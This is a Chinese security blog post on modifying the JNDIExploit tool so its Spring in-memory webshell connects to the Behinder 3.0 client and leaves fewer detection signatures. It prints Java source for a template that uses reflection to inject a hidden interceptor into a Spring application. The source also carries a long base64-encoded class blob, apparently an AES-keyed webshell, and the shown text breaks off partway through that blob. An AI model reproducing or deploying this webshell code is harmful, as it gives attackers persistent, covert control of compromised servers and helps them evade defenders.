---
title: JNDI注入- JNDIExploit 改写内存马适配冰蝎3.0以及魔改
url: https://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497714&idx=1&sn=7e72265e2c25406baf241218d312829a&chksm=eaa97fd2dddef6c4b4c24d1f29ea8b53c1c1768ab293d674208e80d534a69568a89fd33f3087&scene=58&subscene=0#rd
source: 火线Zone
date: 2023-03-29
fetch_date: 2025-10-04T11:02:03.028969
---

# JNDI注入- JNDIExploit 改写内存马适配冰蝎3.0以及魔改

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSoVooy6Rk6a0o29RV1BHOKa8mibOZZ3Bicybuib4O3IGqbDatHbyfEyssoy4lvxhkxM3yDDp2UTY4zQ/0?wx_fmt=jpeg)

# JNDI注入- JNDIExploit 改写内存马适配冰蝎3.0以及魔改

taamr

火线Zone

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSoVooy6Rk6a0o29RV1BHOKjyrKC6AzGLQzsrEakZkRA9gQLYIdH10U9X0nNDRKymzzaRzH8GXMyQ/640?wx_fmt=png)

**序**

最近复现学习Fastjson反序列化漏洞利用的时候，用JNDIExploit注入内存马发现连接不上，得魔改冰蝎，再仔细搜索了几篇文档发现新版的冰蝎已经不用魔改也可以连接了，但是目前开源的JNDIExploit的内存马逻辑得改一改。

后面一想，魔改冰蝎还不如改一改JNDIExploit，毕竟大佬的源码现在是开源的，冰蝎的反编译再编译啥的整理报错太繁杂。而且更改JNDIExploit还有好处，可以自定义内存马逻辑减少一些特征。

最后，参考文章都在文末，前人栽树、后人乘凉，感谢各位大佬。

PS：不是什么难度很高的东西，针对这些其实去年就有小团队内部或者企业内部团队已经完善，且在用。发出来只是作为分享，不用像我一样找半天文章最后还得自己想着怎么改

**JNDIExploit**

首先是JNDIExploit工具，github地址：https://github.com/WhiteHSBG/JNDIExploit

集成了大量gadget和大量的内存马，如下图所示：
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSoVooy6Rk6a0o29RV1BHOKtShyLiaG1Gf2oYPlOWicN6xIQUehXf6gdqUVuDyyH7IsFuL2ry0V5ibeA/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSoVooy6Rk6a0o29RV1BHOKDRpMjmsv4QBl4aaoWib1UWw4hwtTV10icMibJ8icz52STYFLZVBaqAt5mQ/640?wx_fmt=png)

针对JNDI注入的大部分场景都能快速利用，但是**目前开源版本的代码，以及打包的jar支持的冰蝎内存马都得依靠对应魔改的冰蝎去连接**，这个在ABC\_123大佬文章里有魔改过程。

文章地址：[https://mp.weixin.qq.com/s/qE\_AArdpAVL-EoBbILb\_Jg](https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484370&idx=1&sn=41144e2b24cf223753b1f631b7a7269b&scene=21#wechat_redirect)

看过上面文章的基础上，继续翻一翻Behinder源码

**Behinder3.0****增加**

**对HttpServletRequest**

**和HttpServletResponse的支持**

ABC\_123大佬已经写明了，**冰蝎中BasicInfo#equals原来是依赖pageContext获取对应的request、response、session对象的，但是在冰蝎目前最新版本已经不再只依赖pageContext，增加了对HttpServletRequest和HttpServletResponse的支持。**

看看具体代码逻辑是这样的（Behinder3.0beta11 反编译的）。BasicInfo#equals方法开始就会对传入的对象进行辨别，具体是BasicInfo#fillContext
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSoVooy6Rk6a0o29RV1BHOKSqoz8aw1y0a9IF0yhWyl4GoTbYZ0FKXD3lRlP6TibVKaBHMuPc6tkuw/640?wx_fmt=png)
BasicInfo#fillContext的处理逻辑：
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSoVooy6Rk6a0o29RV1BHOKCcIe8oLJlHbovrq2Th3r2EOBBo9Rjfoz8FcovEEGGNQv9wDnlgAR3Q/640?wx_fmt=png)
从代码不难看出，BasicInfo#fillContext就是分了个类，**如果传入的是PageContext对象，那就还走原来从PageContext获取request、response、session的路子，如果是Map对象，那就从Map里获取request、response、session。**

明白这个，我们再看看JNDIExploit内存马实现的一些逻辑。

**JNDIExploit适配冰蝎**

源码github就可以下载。然后所有的内存马有关的类都在src/main/java/com/feihong/ldap/template包中

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSoVooy6Rk6a0o29RV1BHOKe0lYGaCtONoe83RCZ1icia6RqSZsMv3M94piaFWuOMbtTXcuuvvzrW1ew/640?wx_fmt=png)

因为我是注入Spring内存马时候碰到的问题，就先从SpringMemshellTemplate这个类入手吧，当然了解原理了之后后面所有类型的都可以适配。下面是代码详细：

```
package com.feihong.ldap.template;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.servlet.handler.AbstractHandlerMapping;import sun.misc.BASE64Decoder;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.ArrayList;import java.util.LinkedHashSet;public class SpringMemshellTemplate extends AbstractTranslet {    // 这种方式经过测试，可以兼容到 1.3.0.RELEASE    public SpringMemshellTemplate(){        try{            // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性            Field field = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");            // 2. 属性被 private 修饰，所以 setAccessible true            field.setAccessible(true);            // 3. 获取一个 ApplicationContext 实例            WebApplicationContext context =(WebApplicationContext) ((LinkedHashSet)field.get(null)).iterator().next();            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");            field.setAccessible(true);            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)field.get(abstractHandlerMapping);            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();            Class clazz = null;            try{                clazz = classLoader.loadClass("com.feihong.ldap.template.DynamicInterceptorTemplate");            }catch(ClassNotFoundException e){                try{                    BASE64Decoder base64Decoder = new BASE64Decoder();                    String codeClass ="yv66vgAAADMBAwoARQCFCACGCQBEAIcIAIgJAEQAiQoARACKCwCLAIwLAIsAjQgAjgoAjwCQCwCLAJEIAJILAJMAlAgAlQoAlgCXBwCYBwCZCgARAIULAJMAmgoAEQCbCACcCgARAJ0KABEAngoAjwCfCgAQAKAKAJYAoQcAogoAGwCFCwCLAKMKAKQApQoAGwCmCgCWAKcJAEQAqAgAqQcAqgcAWAcAqwoAIwCsBwCtCgCuAK8KAK4AsAoAsQCyCgAjALMHALQKACwAhQgAtQsAtgC3CABiCABkCAC4BwC5CgAzALoIALsKACUAvAcAvQgAvgkAvwDACgCxAMEKAL8AwgcAwwoAPAC6BwDECgA+ALoHAMUKAEAAugcAxgoAQgC6BwDHBwDIAQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBABNiZWhpbmRlclNoZWxsSGVhZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQYmVoaW5kZXJTaGVsbFB3ZAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA2TGNvbS9mZWlob25nL2xkYXAvdGVtcGxhdGUvRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGU7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAAWsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEAAltCAQAJZXZpbENsYXNzAQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA21hcAEAD0xqYXZhL3V0aWwvTWFwOwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEANUxqYXZhL3V0aWwvTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0Oz47AQANU3RhY2tNYXBUYWJsZQcAuQEACkV4Y2VwdGlvbnMBAAppbml0aWFsaXplAQACZXgBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAARjb2RlAQAFYnl0ZXMBAAZtZXRob2QBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsHAMcHAKsHAL0HAMkHAMoHAMMHAMQHAMUHAMYBAApTb3VyY2VGaWxlAQAfRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUuamF2YQEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBACtMb3JnL3NwcmluZ2ZyYW1ld29yay9zdGVyZW90eXBlL0NvbnRyb2xsZXI7DABLAEwBAA5YLUZPUldBUkQtVE8tQgwASABJAQAQYzEzNDllYWRhYTgwN2E3NwwASgBJDABsAEwHAMsMAMwAzQwAzgDPAQAEUE9TVAcAyQwAuADQDADRANIBAAF1BwDTDADUANUBAANBRVMHANYMANcA2AEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA2QDaDADbANwBAAAMANsA3QwA3gDPDADfAOAMAEsA4QwA4gDjAQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwA5ADlBwDmDADnAM8MAOgA6QwA6gDrDABGAEcBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgwA7ADtAQAQamF2YS9sYW5nL09iamVjdAcA7gwA7wDwDADxAPIHAMoMAPMA9AwA9QD2AQARamF2YS91dGlsL0hhc2hNYXABAAdzZXNzaW9uBwD3DAD4APkBAAZlcXVhbHMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAD6AEwBACdjb20uZmVpaG9uZy5sZGFwLnRlbXBsYXRlLk15Q2xhc3NMb2FkZXIMAPsA/AEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQMceXY2NnZnQUFBRElBR3dvQUJRQVdCd0FYQ2dBQ0FCWUtBQUlBR0FjQUdRRUFCanhwYm1sMFBnRUFHaWhNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU95bFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFFa3h2WTJGc1ZtRnlhV0ZpYkdWVVlXSnNaUUVBQkhSb2FYTUJBQ2xNWTI5dEwyWmxhV2h2Ym1jdmJHUmhjQzkwWlcxd2JHRjBaUzlOZVVOc1lYTnpURzloWkdWeU93RUFBV01CQUJkTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPd0VBQzJSbFptbHVaVU5zWVhOekFRQXNLRnRDVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQVZpZVhSbGN3RUFBbHRDQVFBTFkyeGhjM05NYjJGa1pYSUJBQXBUYjNWeVkyVkdhV3hsQVFBU1RYbERiR0Z6YzB4dllXUmxjaTVxWVhaaERBQUdBQWNCQUNkamIyMHZabVZwYUc5dVp5OXNaR0Z3TDNSbGJYQnNZWFJsTDAxNVEyeGhjM05NYjJGa1pYSU1BQThBR2dFQUZXcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjZ0VBRnloYlFrbEpLVXhxWVhaaEwyeGhi...